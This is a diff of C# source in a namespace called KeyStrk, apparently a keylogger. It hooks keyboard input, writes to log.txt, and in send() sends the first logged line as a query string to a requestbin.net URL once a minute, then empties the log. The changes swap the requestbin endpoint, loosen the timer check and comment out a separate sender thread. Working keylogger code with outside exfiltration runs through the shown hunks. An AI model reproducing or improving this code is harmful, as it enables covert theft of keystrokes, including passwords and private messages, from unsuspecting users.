@@ -38,11 +38,11 @@ namespace KeyStrk
 
             //Set up threads
             Thread hookThread = new Thread(HookInput);
-            //Thread sendData = new Thread(dSender.checkSend);
+           
 
             //Start threads
             hookThread.Start();
-           // sendData.Start();
+           
            
 
 
@@ -161,7 +161,7 @@ namespace KeyStrk
             {
                 //Check if enough time has passed since last sending 
                 //set time interval here
-                if (DateTime.Now.Minute - startTime == 1)
+                if (DateTime.Now.Minute - startTime >= 1)
                 {
                     send();
                     startTime = DateTime.Now.Minute;
@@ -178,7 +178,7 @@ namespace KeyStrk
         public void send()
         {
             StreamReader sr = new StreamReader(Application.StartupPath + @"\log.txt");
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/1evrgmf1" + "?" + sr.ReadLine());
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/124n56z1" + "?" + sr.ReadLine());
             sr.Close();
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
             sw.Close();
